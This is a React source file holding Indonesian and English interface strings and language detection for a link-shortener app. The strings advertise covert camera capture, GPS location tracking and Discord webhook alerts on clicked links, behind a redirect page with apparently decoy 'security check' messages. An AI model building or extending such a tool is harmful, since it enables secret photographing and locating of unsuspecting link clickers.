
import React, { createContext, useContext, useState, useEffect, ReactNode } from 'react';

interface LanguageContextType {
  language: 'id' | 'en';
  t: (key: string) => string;
}

const LanguageContext = createContext<LanguageContextType | undefined>(undefined);

const translations = {
  id: {
    // Index page
    'tools_beyond_imagination': 'Tools Beyond Imagination',
    'advanced_tracking': 'Pelacakan Lanjutan',
    'advanced_tracking_desc': 'Pantau klik dengan analitik detail dan data lokasi',
    'real_time_data': 'Data Real-time',
    'real_time_data_desc': 'Dapatkan notifikasi instan dan dashboard komprehensif',
    'global_reach': 'Jangkauan Global',
    'global_reach_desc': 'Akses cepat di seluruh dunia dengan infrastruktur premium',
    'create_magic_link': 'Buat Link Ajaib',
    'transform_urls': 'Ubah URL Anda menjadi alat pelacakan yang kuat dengan analitik lanjutan, tangkapan kamera, pelacakan lokasi, dan notifikasi webhook khusus.',
    'links_created': 'Link Dibuat',
    'uptime': 'Uptime',
    'support': 'Dukungan',
    'powered_by': 'Didukung oleh KaaKangSatir',

    // Generator page
    'create_magic_link_title': 'Buat Link Ajaib',
    'transform_url_desc': 'Ubah URL Anda dengan pelacakan lanjutan',
    'original_url': 'URL Asli',
    'custom_code': 'Kode Khusus (opsional)',
    'discord_webhook': 'Discord Webhook (opsional)',
    'generate_link': 'Buat Link',
    'creating_magic': 'Membuat Keajaiban...',
    'your_magic_link': 'Link Ajaib Anda:',
    'view_analytics_dashboard': 'Lihat Dashboard Analitik',
    'back_to_home': 'Kembali ke Beranda',

    // Dashboard
    'shortlink_dashboard': 'Dashboard ShortLink',
    'dashboard_subtitle': 'Analitik dan statistik komprehensif',
    'total_clicks': 'Total Klik',
    'unique_visitors': 'Pengunjung Unik',
    'conversion_rate': 'Tingkat Konversi',
    'click_analytics': 'Analitik Klik',
    'clicks_over_time': 'Klik dari Waktu ke Waktu',
    'top_locations': 'Lokasi Teratas',
    'recent_activity': 'Aktivitas Terbaru',
    'visitor_info': 'Info Pengunjung',
    'location': 'Lokasi',
    'device': 'Perangkat',
    'time': 'Waktu',
    'no_data': 'Belum ada data tersedia',

    // Shortcode Dashboard
    'link_analytics': 'Analitik Link',
    'detailed_analytics': 'Analitik detail untuk link Anda',
    'original_link': 'Link Asli',
    'short_link': 'Link Pendek',
    'created': 'Dibuat',
    'webhook_url': 'URL Webhook',
    'geographic_data': 'Data Geografis',
    'recent_clicks': 'Klik Terbaru',
    'no_clicks_yet': 'Belum ada klik pada link ini',
    'back_to_dashboard': 'Kembali ke Dashboard',
    'loading_analytics': 'Memuat analitik link...',
    'page_not_found': 'Halaman tidak ditemukan',
    'go_home': 'Ke Beranda',
    'refresh_data': 'Perbarui Data',
    'original_url': 'URL Asli',
    'short_link': 'Link Pendek',
    'photo_captured': 'Foto Ditangkap',
    'location_captured': 'Lokasi Ditangkap',
    'ip_only_capture': 'Tangkapan IP Saja',
    'unknown_capture': 'Tangkapan Tidak Dikenal',
    'download': 'Unduh',
    'view_on_map': 'Lihat di Peta',
    'accuracy': 'Akurasi',
    'device_info': 'Info Perangkat',
    'location_info': 'Info Lokasi',
    'ip_location': 'Lokasi IP',
    'gps_coordinates': 'Koordinat GPS',
    'reason': 'Alasan',
    'country': 'Negara',
    'city': 'Kota',
    'region': 'Wilayah',
    'timezone': 'Zona Waktu',
    'os': 'OS',
    'browser': 'Browser',
    'platform': 'Platform',
    'language': 'Bahasa',
    'screen': 'Layar',
    'meters': 'meter',
    'unknown': 'Tidak Dikenal',
    'type': 'Tipe',
    'ip_address': 'Alamat IP',
    'tracking_details': 'Detail Pelacakan',
    'no_clicks_share_link': 'Bagikan link Anda untuk mulai mengumpulkan data analitik.',

    // Redirect page
    'link_processor': 'Pemroses Link',
    'loading_link': 'Memuat link...',
    'please_wait': 'Harap tunggu saat kami memproses permintaan Anda...',
    'security_check': 'Pemeriksaan Keamanan',
    'verifying_safety': 'Memverifikasi keamanan link',
    'browser_check': 'Pemeriksaan Browser',
    'analyzing_browser': 'Menganalisis browser Anda',
    'ready': 'Siap',
    'preparing_redirect': 'Mempersiapkan pengalihan',
    'checking_security': 'Memeriksa protokol keamanan...',
    'analyzing_environment': 'Menganalisis lingkungan browser...',
    'all_checks_completed': 'Semua pemeriksaan selesai! Mengalihkan...',
    'verified': '✓ Terverifikasi',
    'processing': '⏳ Memproses...',
    'complete': '✓ Selesai',
    'powered_by_security': 'Didukung oleh protokol keamanan canggih',

    // 404 page
    'page_not_found': 'Halaman Tidak Ditemukan',
    'page_vanished': 'Ups! Halaman yang Anda cari sepertinya telah menghilang ke dalam kehampaan digital.',
    'wrong_turn': 'Jangan khawatir, bahkan penjelajah terbaik terkadang salah jalan. Mari kita bawa Anda kembali ke jalur yang benar!',
    'go_home': 'Ke Beranda',
    'create_link': 'Buat Link',
    'did_you_know': 'Tahukah Anda?',
    'fun_fact': 'Error 404 dinamai berdasarkan ruang 404 di CERN, tempat web lahir. Meskipun cerita ini tidak benar, tetap menjadi bagian menyenangkan dari cerita rakyat internet!',
    'lost_help': 'Tersesat? Keajaiban ShortLink kami dapat membantu Anda menemukan jalan!'
  },
  en: {
    // Index page
    'tools_beyond_imagination': 'Tools Beyond Imagination',
    'advanced_tracking': 'Advanced Tracking',
    'advanced_tracking_desc': 'Monitor clicks with detailed analytics and location data',
    'real_time_data': 'Real-time Data',
    'real_time_data_desc': 'Get instant notifications and comprehensive dashboards',
    'global_reach': 'Global Reach',
    'global_reach_desc': 'Fast worldwide access with premium infrastructure',
    'create_magic_link': 'Create Magic Link',
    'transform_urls': 'Transform your URLs into powerful tracking tools with advanced analytics, camera capture, location tracking, and custom webhook notifications.',
    'links_created': 'Links Created',
    'uptime': 'Uptime',
    'support': 'Support',
    'powered_by': 'Powered by KaaKangSatir',

    // Generator page
    'create_magic_link_title': 'Create Magic Link',
    'transform_url_desc': 'Transform your URL with advanced tracking',
    'original_url': 'Original URL',
    'custom_code': 'Custom Code (optional)',
    'discord_webhook': 'Discord Webhook (optional)',
    'generate_link': 'Generate Link',
    'creating_magic': 'Creating Magic...',
    'your_magic_link': 'Your Magic Link:',
    'view_analytics_dashboard': 'View Analytics Dashboard',
    'back_to_home': 'Back to Home',

    // Dashboard
    'shortlink_dashboard': 'ShortLink Dashboard',
    'dashboard_subtitle': 'Comprehensive analytics and statistics',
    'total_clicks': 'Total Clicks',
    'unique_visitors': 'Unique Visitors',
    'conversion_rate': 'Conversion Rate',
    'click_analytics': 'Click Analytics',
    'clicks_over_time': 'Clicks Over Time',
    'top_locations': 'Top Locations',
    'recent_activity': 'Recent Activity',
    'visitor_info': 'Visitor Info',
    'location': 'Location',
    'device': 'Device',
    'time': 'Time',
    'no_data': 'No data available yet',

    // Shortcode Dashboard
    'link_analytics': 'Link Analytics',
    'detailed_analytics': 'Detailed analytics for your link',
    'original_link': 'Original Link',
    'short_link': 'Short Link',
    'created': 'Created',
    'webhook_url': 'Webhook URL',
    'geographic_data': 'Geographic Data',
    'recent_clicks': 'Recent Clicks',
    'no_clicks_yet': 'No clicks on this link yet',
    'back_to_dashboard': 'Back to Dashboard',
    'loading_analytics': 'Loading link analytics...',
    'page_not_found': 'Page not found',
    'go_home': 'Go Home',
    'refresh_data': 'Refresh Data',
    'original_url': 'Original URL',
    'short_link': 'Short Link',
    'photo_captured': 'Photo Captured',
    'location_captured': 'Location Captured',
    'ip_only_capture': 'IP Only Capture',
    'unknown_capture': 'Unknown Capture',
    'download': 'Download',
    'view_on_map': 'View on Map',
    'accuracy': 'Accuracy',
    'device_info': 'Device Info',
    'location_info': 'Location Info',
    'ip_location': 'IP Location',
    'gps_coordinates': 'GPS Coordinates',
    'reason': 'Reason',
    'country': 'Country',
    'city': 'City',
    'region': 'Region',
    'timezone': 'Timezone',
    'os': 'OS',
    'browser': 'Browser',
    'platform': 'Platform',
    'language': 'Language',
    'screen': 'Screen',
    'meters': 'meters',
    'unknown': 'Unknown',
    'type': 'Type',
    'ip_address': 'IP Address',
    'tracking_details': 'Tracking Details',
    'no_clicks_share_link': 'Share your link to start collecting analytics data.',

    // Redirect page
    'link_processor': 'Link Processor',
    'loading_link': 'Loading link...',
    'please_wait': 'Please wait while we process your request...',
    'security_check': 'Security Check',
    'verifying_safety': 'Verifying link safety',
    'browser_check': 'Browser Check',
    'analyzing_browser': 'Analyzing your browser',
    'ready': 'Ready',
    'preparing_redirect': 'Preparing redirect',
    'checking_security': 'Checking security protocols...',
    'analyzing_environment': 'Analyzing browser environment...',
    'all_checks_completed': 'All checks completed! Redirecting...',
    'verified': '✓ Verified',
    'processing': '⏳ Processing...',
    'complete': '✓ Complete',
    'powered_by_security': 'Powered by advanced security protocols',

    // 404 page
    'page_not_found': 'Page Not Found',
    'page_vanished': 'Oops! The page you\'re looking for seems to have vanished into the digital void.',
    'wrong_turn': 'Don\'t worry, even the best explorers sometimes take a wrong turn. Let\'s get you back on track!',
    'go_home': 'Go Home',
    'create_link': 'Create Link',
    'did_you_know': 'Did You Know?',
    'fun_fact': 'The 404 error was named after room 404 at CERN, where the web was born. Though this story isn\'t true, it\'s still a fun piece of internet folklore!',
    'lost_help': 'Lost? Our ShortLink magic can help you find your way!'
  }
};

export const LanguageProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
  const [language, setLanguage] = useState<'id' | 'en'>('en');

  useEffect(() => {
    const detectLanguage = () => {
      try {
        // Get timezone
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        
        // Get browser language
        const browserLang = navigator.language || navigator.languages?.[0] || 'en';
        
        // Check if timezone indicates Indonesia
        const isIndonesianTimezone = timezone.includes('Jakarta') || timezone.includes('Asia/Jakarta');
        
        // Check if browser language is Indonesian
        const isIndonesianLang = browserLang.startsWith('id');
        
        // Set language to Indonesian if either condition is met
        if (isIndonesianTimezone || isIndonesianLang) {
          setLanguage('id');
        } else {
          setLanguage('en');
        }
      } catch (error) {
        console.log('Language detection fallback to English');
        setLanguage('en');
      }
    };

    detectLanguage();
  }, []);

  const t = (key: string): string => {
    return translations[language][key as keyof typeof translations['en']] || key;
  };

  return (
    <LanguageContext.Provider value={{ language, t }}>
      {children}
    </LanguageContext.Provider>
  );
};

export const useLanguage = (): LanguageContextType => {
  const context = useContext(LanguageContext);
  if (!context) {
    throw new Error('useLanguage must be used within a LanguageProvider');
  }
  return context;
};
